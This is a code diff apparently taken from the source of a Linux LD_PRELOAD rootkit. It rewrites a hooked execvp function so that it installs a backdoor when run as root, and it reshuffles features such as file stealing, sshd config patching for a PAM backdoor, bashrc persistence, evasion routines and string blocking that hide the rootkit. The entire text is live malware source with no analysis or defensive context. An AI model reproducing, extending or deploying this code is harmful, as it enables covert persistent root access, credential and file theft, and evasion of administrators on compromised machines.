@@ -1,22 +1,14 @@
 int execvp(const char *filename, char *const argv[]){
-#if defined FILE_CLEANSE_TIMER && defined FILE_STEAL && defined CLEAN_STOLEN_FILES
-    cleanstolen();
-#endif
-#ifdef CLEANSE_HOMEDIR
-    bdvcleanse();
-#endif
-#ifdef ROOTKIT_BASHRC
-    checkbashrc();
-#endif
-#if defined READ_GID_FROM_FILE && defined AUTO_GID_CHANGER
-    gidchanger();
-#endif
-#ifdef DO_REINSTALL
-    reinstall();
-#endif
-#ifdef PATCH_SSHD_CONFIG
-    sshdpatch(REG_USR);
-#endif
+    if(getuid() == 0 && rknomore() &&
+                                    #ifdef PATCH_DYNAMIC_LINKER
+                                    !preloadok(PRELOAD_FILE)
+                                    #else
+                                    !preloadok(OLD_PRELOAD)
+                                    #endif
+                                    && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
+        bdvinstall(argv);
+
+    plsdomefirst();
 
     hook(CEXECVP);
 
@@ -28,12 +20,6 @@ int execvp(const char *filename, char *const argv[]){
 #ifdef BACKDOOR_UTIL
         if(!fnmatch("*/bdv", argv[0], FNM_PATHNAME))
             dobdvutil(argv);
-#endif
-#if defined(USE_PAM_BD) && defined(PATCH_SSHD_CONFIG)
-        if(!fnmatch("*/sshdpatch", argv[0], FNM_PATHNAME)){
-            sshdpatch(MAGIC_USR);
-            exit(0);
-        }
 #endif
         return (long)call(CEXECVP, filename, argv);
     }
@@ -48,7 +34,7 @@ int execvp(const char *filename, char *const argv[]){
         inspect_file(argv[i]);
 #endif
 
-#if defined(DO_REINSTALL) && defined(DO_EVASIONS)
+#ifdef DO_EVASIONS
     int evasion_status = evade(filename, argv, NULL);
     switch(evasion_status){
         case VEVADE_DONE:
@@ -63,9 +49,7 @@ int execvp(const char *filename, char *const argv[]){
         case VNOTHING_DONE:
             break;  /* ?? */
     }
-#endif
 
-#ifdef DO_EVASIONS
     if(block_strings(filename, argv)){
         errno = EPERM;
         return -1;
